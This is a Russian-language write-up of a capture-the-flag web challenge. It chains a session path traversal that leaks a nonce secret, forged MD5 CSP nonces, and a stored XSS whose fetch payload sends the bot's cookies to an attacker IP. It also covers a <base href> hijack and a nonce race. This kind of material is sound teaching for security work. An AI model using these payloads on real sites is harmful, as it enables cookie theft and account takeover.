# Strict Notes Writeup

## Описание таска

Не выходи из вебчика - не совершай ошибку,
Зачем тебе пывны, если ты куришь шипку?
За багой бессмысленно все, особенно - возглас счастья,
Только крипту реши - и сразу же возвращайся!

## Флаг

`kxctf{s0rry_1_r34ly_l0v3_ch41ns}`

## Райтап

По интересной случайности у таска, помимо интендед решения, оказалось еще два, поэтому расскажу про все :)

### Интендед решение

CSP - это политика контроля источников ресурсов в браузерах.  
В content-security-policy была прописана следующая конфигурация `script-src 'nonce-<рандомный nonce>' 'strict-dynamic'; img-src 'none'; style-src 'self'; frame-src 'none';`. Директива 'strict-dynamic' означала, что браузер будет исполнять, только те скрипты, которые будут иметь в качестве атрибута такой же nonce, как и в HTTP-заголовке ответа 'Content-Security-Policy'. В приложении была такая реализация:
Код генерации шаблонов:
```python
nonce_value = nonce.generate(config.nonce_secret)
    resp = make_response(render_template(template, nonce=nonce_value))
    resp.headers['Content-Security-Policy'] = config.csp_config.format(nonce_value)
```

Код подстановки nonce в качестве атрибута script:
```js
<script nonce="{{ nonce }}" src="/static/js/script.js"></script>
```

Благодаря CSP мы можем сделать так, чтобы браузер исполнял только доверенный нам скрипт, который мы, своего рода, подписали, а все остальные просто отрисовывал, как текст.
Посмотрим на функцию генерации nonce:

```python
def generate(secret: str) -> str:
    phrase = secret + str(int(time.time()))
    return hashlib.md5(phrase.encode()).hexdigest()
```

Мы видим, что nonce на самом деле псевдорандомный и генерируется на основе времени и секрета из конфига `secrets.json`

Получается, получив доступ к секрету, мы сможем сгенерировать валидный nonce, который пройдет проверку и исполнит наш произвольный код. Давайте изучать код дальше и думать, как мы можем достать секрет.

Функция регистрации дает возможность записать в auth-сессию произвольный адрес, не вырезая `../`:
```python
# Используется
session['username'] = username
# А должно быть:
session['username'] = os.path.basename(username)
```

Посмотрим дальше - открытие файлов собственных личных заметок (в ручке `/my`) происходит не с помощью сохраненных безопасных имен пользователей, а с помощью небезоасных гначений в сессииях:
```python
notes.append(json.loads(open(f"/app/user_notes/{session['username']}/{os.path.basename(request.args['id'])}").read()))
```

Таким образом первый шаг эксплуатации такой:
- регистрируем пользователя `../../app`
- переходим по пути `/my?id=secrets.json` и получаем значение секрета, на основе которого генерируются nonce. 

Далее нам надо сгенерировать nonce на несколько секунд вперед (в примере будем делать на 20)
Сделать это можно с помощью питона:
```python
# secret украден из secrets.json 
secret = "asd"
phrase = secret + str(int(time.time()) + 20) # На десять секунд вперед
nonce = hashlib.md5(phrase.encode()).hexdigest()
```

Поле `title` подставляется небезопасным образом, не валидируя опасные для xss символы (оставляем исполнение скриптов на csp - такая конфигурация часто используется в больших приложениях для создания красивых сообщений):
В темплейте:
```html
{% if safe and key in safe: %}
    <td>{{ note[key]|safe }}</td>
{% else %}
    <td>{{ note[key] }}</td>
{% endif %}
```
В рендере видим (невалидируемый `title`):
```python
resp = make_response(render_template("filtered_notes.html", nonce=nonce_value, safe=['title'], title="Public notes", notes=notes))
```

Создаем заметку, в которой в качестве названия указываем следующий xss пейлоад:
```javascript
<script nonce="<сгенерированный nonce на основе секрета>">fetch("http://<удаленный айпишник>/flag?"+dpcument.cookie)</script>
```

После создания получаем от приложение идентификатор заметки.
Через двадцать секунд после генерации nonce сервера будет таким же, как сгенерированный нами(см. выше)
Поднимаем http-server (самый частый пример `python3 -m http.server <port>`) у себя и отправляем запрос на переход бота на нашу уязвимую заметку: `/vote?id=<our uuid>`

В куках бота лежит флаг, поэтому в логах нашего сервера мы увидим запрос, в гет-параметрах которого будет флаг

### Анинтендед решение 1

У тега `base`, не входящего в ограничения CSP, есть возможность поменять базовое расположение, откуда будут подтягиваться все ресурсы на веб-страницу - делается это через атрибут `href`. 

Алгоритм атаки:
- Поднимаем http-сервер и по пути `/static/js/script.js` располагаем наш скрипт
- Создаем записку, в которой пишем `<base href="http://<your own domain name>">`
- Получаем xss без обхода nonce-ов

### Анинтендед решение 2

Так как каждый nonce является валидным в течение целой секунды, мы можем организовать race с помощью скрипта:
- Сходим на любую страницу и посмотрим какой nonce сейчас валидный
- Создадим заметку с <script> и таким nonce-ом
- Отправим бота на эту записку

Таск решен)

## Powered by [FrakenboK](https://github.com/FrakenboK)